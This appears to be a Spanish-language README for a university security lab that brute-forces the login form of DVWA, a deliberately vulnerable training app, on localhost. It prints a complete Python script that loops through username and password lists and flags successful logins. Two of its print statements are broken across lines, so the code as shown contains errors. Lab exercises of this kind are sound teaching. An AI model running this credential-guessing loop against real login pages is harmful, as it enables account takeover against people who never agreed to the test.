
# Laboratorio de Criptografía y Seguridad en Redes - Fuerza Bruta con Python

## Introducción

Este repositorio contiene el desarrollo del **Laboratorio 2** de **Criptografía y Seguridad en Redes**, el cual está enfocado en realizar un ataque de **fuerza bruta** sobre el sistema de autenticación de la aplicación web **DVWA** (Damn Vulnerable Web Application). A través de este laboratorio, se exploran diversas herramientas y métodos para automatizar el proceso de fuerza bruta, con el objetivo de obtener combinaciones de usuario y contraseña válidas.

El script de Python desarrollado para este laboratorio utiliza la librería **`requests`** para interactuar con el formulario de inicio de sesión de DVWA. El script prueba todas las combinaciones posibles de usuarios y contraseñas, detectando automáticamente las credenciales correctas.

## Archivos Principales

- **`script.py`**: El archivo principal del laboratorio. Contiene el script en Python que realiza el ataque de fuerza bruta sobre el formulario de inicio de sesión de DVWA.
- **`users.txt`**: Un archivo de texto que contiene una lista de usuarios a probar.
- **`pass.txt`**: Un archivo de texto que contiene una lista de contraseñas a probar.

## Requisitos

- Python 3.x
- La librería `requests` de Python

## Cómo Ejecutar el Script

1. Asegúrate de tener **DVWA** corriendo en tu máquina local, y que esté accesible en `http://localhost:4280`.
2. Coloca los archivos **`users.txt`** y **`pass.txt`** con las listas de combinaciones de usuario y contraseña en el mismo directorio que el script `script.py`.
3. Ejecuta el siguiente comando para ejecutar el ataque de fuerza bruta:
   ```bash
   python3 script.py
   ```

El script hará intentos de inicio de sesión utilizando las combinaciones de **`users.txt`** y **`pass.txt`**, verificando si la autenticación es exitosa o no. Si las credenciales son correctas, el script las mostrará en consola.

## Explicación del Código

### 1. **Configuración**

El script comienza configurando la URL de DVWA y los archivos de diccionarios de usuarios y contraseñas:

```python
URL = "http://localhost:4280/vulnerabilities/brute/"
USERS_FILE = "users.txt"
PASS_FILE  = "pass.txt"
```

### 2. **Cabeceras HTTP**

Se configuran las cabeceras HTTP necesarias para emular una solicitud legítima de un navegador:

```python
HEADERS = {
    "User-Agent": "Mozilla/5.0 ..."
                  "Chrome/135...",
    "Cookie": "security=low; PHPSESSID=TUCOOKIEAKI"
}
```

### 3. **Lectura de los Diccionarios de Usuarios y Contraseñas**

Se leen los diccionarios `users.txt` y `pass.txt` que contienen las combinaciones de usuario y contraseña:

```python
def load_list(path):
    with open(path, "r") as f:
        return [l.strip() for l in f if l.strip()]

users     = load_list(USERS_FILE)
passwords = load_list(PASS_FILE)
```

### 4. **Ataque de Fuerza Bruta**

El script realiza un **ataque de fuerza bruta** mediante solicitudes GET a la URL de DVWA, probando cada combinación de usuario y contraseña:

```python
session = requests.Session()
session.headers.update(HEADERS)

found = []
start = time.time()

for user in users:
    for pwd in passwords:
        resp = session.get(URL, params={
            "username": user,
            "password": pwd,
            "Login": "Login"
        })
        if "Username and/or password incorrect" not in resp.text:
            found.append((user, pwd))
            print(f"[+] Credenciales válidas: {user} / {pwd}")

end = time.time()
```

### 5. **Resultados**

Al finalizar el ataque, el script muestra las credenciales válidas y el tiempo total del ataque:

```python
print("
=== RESULTADOS ===")
for u,p in found:
    print(f" • {u}:{p}")
print(f"
Tiempo total de ataque: {end - start:.2f} segundos")
```

---

